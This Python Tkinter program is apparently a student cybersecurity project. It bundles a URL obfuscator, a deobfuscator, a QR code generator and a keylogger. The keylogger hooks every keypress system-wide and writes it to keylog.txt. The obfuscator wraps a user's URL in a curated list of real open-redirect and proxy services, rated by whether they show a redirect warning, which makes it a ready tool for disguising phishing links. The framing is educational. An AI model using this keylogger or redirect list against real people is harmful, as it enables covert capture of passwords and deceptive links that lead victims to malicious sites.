import tkinter as tk
from tkinter import messagebox, scrolledtext
from urllib.parse import urlparse
from PIL import Image, ImageTk
import threading
import keyboard
import logging
import qrcode

logging.basicConfig(filename='keylog.txt', level=logging.DEBUG)

running = False

def log_key(event):
    logging.info(str(event.name))


def keylogger_thread():
    global running
    running = True
    print("Starting keylogger...")
    keyboard.on_press(log_key)
    while running:
        pass  # This loop keeps the thread running
    # When running becomes False, stop the keylogger
    keyboard.unhook_all()
    print("Keylogger stopped.")

def start_keylogger():
    threading.Thread(target=keylogger_thread).start()

def stop_keylogger():
    global running
    running = False
    print("Keylogger stopped.")


class UrlObfuscatorGUI:
    def __init__(self, master):
        self.master = master
        self.master.title("URL Obfuscator")

        self.label = tk.Label(master, text="Enter URL:")
        self.label.pack()

        self.url_entry = tk.Entry(master, width=50)
        self.url_entry.pack()

        self.obfuscate_button = tk.Button(master, text="Obfuscate", command=self.show_obfuscation_options)
        self.obfuscate_button.pack(pady=10)

        self.result_label = tk.Label(master, text="")
        self.result_label.pack()

    def show_obfuscation_options(self):
        self.obfuscate_button.config(state=tk.DISABLED)  # Disable the obfuscate button

        self.options_label = tk.Label(self.master, text="Select Obfuscation Option:")
        self.options_label.pack()

        self.redirection_button = tk.Button(self.master, text="URLS with Redirection Notice", command=lambda: self.obfuscate_selected_option(0))
        self.redirection_button.pack(pady=5)

        self.no_warning_button = tk.Button(self.master, text="URLS with No Redirection Warnings", command=lambda: self.obfuscate_selected_option(1))
        self.no_warning_button.pack(pady=5)

        # self.onion_button = tk.Button(self.master, text="ONION URLs", command=lambda: self.obfuscate_selected_option(2))
        # self.onion_button.pack(pady=5)

        # self.tor_redirection_button = tk.Button(self.master, text="Tor Onion URL Redirection", command=lambda: self.obfuscate_selected_option(3))
        # self.tor_redirection_button.pack(pady=5)

    def obfuscate_selected_option(self, option):
        url = self.url_entry.get()
        obfuscated_urls = self.obfuscate(url, option)
        self.save_to_file(obfuscated_urls)
        self.result_label.config(text="Obfuscated URLs saved to 'url_obfuscated.txt'.")
        self.reset_options()

    def reset_options(self):
        self.options_label.pack_forget()
        self.redirection_button.pack_forget()
        self.no_warning_button.pack_forget()
        # self.onion_button.pack_forget()
        # self.tor_redirection_button.pack_forget()
        self.obfuscate_button.config(state=tk.NORMAL)  # Re-enable the obfuscate button

    def obfuscate(self, url, option):
        open_redirect = [
            ['URLS with Redirection Notice: \n',
            'https://www.google.com/url?q=',  # Redirect using Google .[  Google Redirect Notice. ] [ source: Google ]
            'https://google.com/url?q='     , # Variant of above redirect. [ Warning prsent ] [ source: M.Anish ]
            ], 
            ['URLS with No Redirection Warnings: \n',
            'https://via.hypothes.is/' ,      # Annotation service.     [ No warning ] [ source : Google ]
            'http://vk.com/away.php?to=',     # Open Redirect in Russian Social Media vk.com [ No warning! ]
            'https://googleweblight.com/i?u=' ,# Redirect using Googleweblight [ No warning ]  [ source: Google ]
            'https://l.wl.co/l?u=',              # Open_redirect Whatsapp Business Account Profile website links. [ source:M.Anish]
            'https://tor2web.onionsearchengine.com/index.php?q=', #Open_redirect in Proxy.[ No warning ][ source: M.Anish]
            # 'https://onionengine.com/url.php?u=', #Open_redirect.[ No warning ][ source: M.Anish ] 
            # 'http://raspe.id.au/bypass/miniProxy.php?', #Open_redirect in proxy [ No warning ] [ Difficult to detect ]
            'https://www.awin1.com/cread.php?awinmid=6798&awinaffid=673201&ued=', # [ No warning ]
            # 'https://www.anrdoezrs.net/click-6361382-15020510?url=', # [ No warning ]
            # 'https://www.digit.in/flipkart/intermediate?url=', # [ Easy to detect ]
            'https://adclick.g.doubleclick.net/pcs/click?xai=AKAOjstFA55hCSrFSTBDNko3225YAz6GkouTQlHjExWXRbT5OPMnSlE8Wh4LAVp-D7jWRr-LcKW0w-HH1g8lCVAK_eU-5azfUXfjqfTiHFOFWV9I8m2ZaGczGlov1iY8kMSnelCX-AHG6VYBmpcZJapT1XbdlOM3B9u9whYqpkxEpFLbkzwDao00-DL8JyS7UIxIApb_JHANRmtKLSuRcM8IWqFaP0cOc8n8jTedmwHc8oAw2MV2tRUaAnN3eaxaESpc8fovDeWslJ0A3duo5g46YzCYxQ8A56RI5MGcQw4TZj6TeWuj6jRjAe7g0X18--IBmztC1sUi6XuHkB1Ew-z_h9bv1XK-s_9L6zeDfQPtMsI3hOqp8T8545VdgCoElxs&sig=Cg0ArKJSzEpZ_YMvCKWCEAE&fbs_aeid=[gw_fbsaeid]&urlfix=1&adurl=', # [ No warning ]
            'https://shop-links.co/link?publisher_slug=future&exclusive=1&u1=tomsguide-in-2620345246174741000&url=', # [ No warning ]
            # 'https://meumundomaisdigital.com.br/wp-content/plugins/super-links/application/helpers/super-links-proxy.php?', # Open_redirect in proxy [ No warning ] 
            # 'http://media.mailadam.com/proxy/index.php?', # Open_redirect in proxy [ No warning ] 
            # 'http://f2pool.cam/index.php?', # Open_redirect in proxy [ No warning ] 
            'https://www.coinmarketguide.com/index.php?' # Open_redirect in proxy [ No warning ] 
            # 'https://loja.rarp.com.br/wp-content/plugins/super-links/application/helpers/super-links-proxy.php?', # Open_redirect in proxy [ No warning ] 
            # 'http://prox.x86.co.uk/index.php?', # Open_redirect in proxy [ No warning ] 
            # 'https://ersupport.com/plugins/QuickWebProxy/miniProxy.php?', # Open_redirect in proxy [ No warning ] 
            # 'http://ps-chi.herokuapp.com/index.php?', # Open_redirect in proxy [ No warning ] 
            # 'http://xlx723.dyndns.org/iproxy/miniProxy.php?', # Open_redirect in proxy [ No warning ] 
            # 'http://proxy.voracek.net/subdom/proxy/index.php/', # Open_redirect in proxy [ No warning ] 
            ],
            # ['ONION URLs:\n',
            # 'http://haystak5njsmn2hqkewecpaxetahtwhsbsa64jom2k22z5afxhnpxfid.onion/redir.php?url=',#Redirect using Haystack DEEP WEB search. [ ONION SERVICE][source:M.Anish]
            # 'http://zgphrnyp45suenks3jcscwvc5zllyk3vz4izzw67puwlzabw4wvwufid.onion/url.php?u=' #Open_redirect  [ no warning . ]  
            # ],
            # ['Tor Onion URL Redirection [only works for sites ending with .onion]:\n',
            # 'https://ahmia.fi/search/search/redirect?search_term=cat&redirect_url=', #Redirect in Ahmia Search [ easily detectable]     
            # 'http://juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion/search/search/redirect?search_term=cat&redirect_url=' #Redirect Ahmia [ easily detectable]    
            # ]
        ]
        obfuscated_urls = []
        for pattern in open_redirect[option]:
            obfuscated_urls.append(f"{pattern}{url}")
        return obfuscated_urls

    def save_to_file(self, obfuscated_urls):
        with open('url_obfuscated.txt', 'w') as f:
            f.write('\n'.join(obfuscated_urls))

    
class UrlDeobfuscatorGUI:
    def __init__(self, master):
        self.master = master
        self.master.title("URL Deobfuscator")

        self.label = tk.Label(master, text="Enter Obfuscated URL:")
        self.label.pack()

        self.obfuscated_entry = tk.Entry(master, width=50)
        self.obfuscated_entry.pack()

        self.deobfuscate_button = tk.Button(master, text="Deobfuscate", command=self.deobfuscate_url)
        self.deobfuscate_button.pack(pady=10)

        self.result_text = scrolledtext.ScrolledText(master, width=60, height=10, wrap=tk.WORD)
        self.result_text.pack(pady=10)
        self.result_text.insert(tk.END, "Deobfuscated URL will appear here.")

    def deobfuscate_url(self):
        obfuscated_url = self.obfuscated_entry.get().strip()
        deobfuscated_url = self.deobfuscate(obfuscated_url)
        self.result_text.config(state=tk.NORMAL)
        self.result_text.delete(1.0, tk.END)
        self.result_text.insert(tk.END, deobfuscated_url)
        self.result_text.config(state=tk.DISABLED)

    def deobfuscate(self, obfuscated_url):
        # List of common obfuscation patterns and their corresponding deobfuscation prefixes
        patterns = {
            'https://www.google.com/url?q=': 'Deobfuscated URL (Google Redirect): ',
            'https://via.hypothes.is/': 'Deobfuscated URL (Hypothes.is): ',
            'http://vk.com/away.php?to=': 'Deobfuscated URL (VK Redirect): ',
            'https://googleweblight.com/i?u=': 'Deobfuscated URL (Google Web Light): ',
            'https://l.wl.co/l?u=': 'Deobfuscated URL (WhatsApp Business Profile): ',
            'https://tor2web.onionsearchengine.com/index.php?q=': 'Deobfuscated URL (OnionSearchEngine Proxy): ',
            'https://ahmia.fi/search/search/redirect?search_term=': 'Deobfuscated URL (Ahmia Search): ',
            'http://juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion/search/search/redirect?search_term=': 'Deobfuscated URL (Ahmia Onion Search): ',
            'http://haystak5njsmn2hqkewecpaxetahtwhsbsa64jom2k22z5afxhnpxfid.onion/redir.php?url=': 'Deobfuscated URL (Haystack Onion Search): ',
            'http://zgphrnyp45suenks3jcscwvc5zllyk3vz4izzw67puwlzabw4wvwufid.onion/url.php?u=': 'Deobfuscated URL (Custom Onion Service): ',
            # Add more patterns and their respective deobfuscation prefixes as needed
        }

        # Attempt to match and deobfuscate the URL
        for pattern, prefix in patterns.items():
            if obfuscated_url.startswith(pattern):
                deobfuscated_url = obfuscated_url.replace(pattern, prefix)
                return deobfuscated_url

        # If no specific pattern is matched, return the original URL
        return obfuscated_url

class QRCodeGeneratorGUI:
    def __init__(self, master):
        self.master = master
        self.master.title("QR Code Generator")

        self.label = tk.Label(master, text="Enter URL:")
        self.label.pack()

        self.url_entry = tk.Entry(master, width=50)
        self.url_entry.pack()

        self.generate_button = tk.Button(master, text="Generate QR Code", command=self.generate_and_save_qr_code)
        self.generate_button.pack(pady=10)

        self.qr_code_image_label = tk.Label(master)
        self.qr_code_image_label.pack(pady=10)

    def generate_and_save_qr_code(self):
        url = self.url_entry.get().strip()

        # Generate QR code
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(url)
        qr.make(fit=True)

        # Create QR code image
        qr_image = qr.make_image(fill="black", back_color="white")
        qr_image = qr_image.resize((200, 200))  # Resize for display
        photo = ImageTk.PhotoImage(image=qr_image)

        self.qr_code_image_label.config(image=photo)
        self.qr_code_image_label.image = photo  # Keep a reference to avoid garbage collection issues

        # Save QR code image as PNG
        file_name = "qr_code.png"
        qr_image.save(file_name)
        print(f"QR code saved as '{file_name}'.")

        # Display success message
        success_label = tk.Label(self.master, text=f"QR code saved as '{file_name}'.")
        success_label.pack(pady=5)


def open_about_window(title, info):
    messagebox.showinfo(title, info)

def main():
    root = tk.Tk()
    root.title("ITNS C2P2 CIE Project")

    # Load and display the image
    image = Image.open("itns.png")
    image = image.resize((800, 160))
    photo = ImageTk.PhotoImage(image)

    image_label = tk.Label(root, image=photo)
    image_label.image = photo
    image_label.pack(pady=10)

    # Create a menu bar
    menubar = tk.Menu(root)
    root.config(menu=menubar)

    # Add menu items to the menu bar
    file_menu = tk.Menu(menubar, tearoff=0)
    file_menu.add_command(label="About URL Obfuscation", command=lambda: open_about_window("About URL Obfuscation", "URL obfuscation involves altering a URL to disguise its true destination. This technique is commonly used to create redirects or hide malicious links. Obfuscated URLs can be challenging to detect and may pose security risks if used for malicious purposes."))
    file_menu.add_command(label="About Keylogger", command=lambda: open_about_window("About Keylogger", "A keylogger is a tool used to capture and record keystrokes made by a user on a computer or mobile device. Keyloggers can be used for various purposes, including monitoring user activity, gathering passwords, or conducting forensic investigations."))
    file_menu.add_command(label="About the Developer", command=lambda: open_about_window("About Developer", "The ITNS Project, designed by Armaan Naik under the guidance of Professor Suhas Chavan, represents a collaborative effort aimed at developing a robust cybersecurity toolset. This project delves into key areas such as URL obfuscation, deobfuscation, and keylogging, providing valuable tools for analyzing and securing online activities."))
    menubar.add_cascade(label="Info", menu=file_menu)

    # Create and configure the main UI components
    obfuscate_button = tk.Button(root, text="Open URL Obfuscator", command=lambda: UrlObfuscatorGUI(tk.Toplevel(root)))
    obfuscate_button.pack(pady=15)

    deobfuscate_button = tk.Button(root, text="Open URL Deobfuscator", command=lambda: UrlDeobfuscatorGUI(tk.Toplevel(root)))
    deobfuscate_button.pack(pady=15)

    def open_qr_code_generator():
        qr_code_window = tk.Toplevel(root)
        QRCodeGeneratorGUI(qr_code_window)

    qr_code_button = tk.Button(root, text="Generate QR Code", command=open_qr_code_generator)
    qr_code_button.pack(pady=10)

    keylogger_frame = tk.Frame(root)
    keylogger_frame.pack(pady=10)

    start_keylogger_button = tk.Button(keylogger_frame, text="Start Keylogger", command=start_keylogger)
    start_keylogger_button.pack(side=tk.LEFT, padx=5)

    stop_keylogger_button = tk.Button(keylogger_frame, text="Stop Keylogger", command=stop_keylogger)
    stop_keylogger_button.pack(side=tk.LEFT, padx=5)

    root.mainloop()

if __name__ == "__main__":
    main()
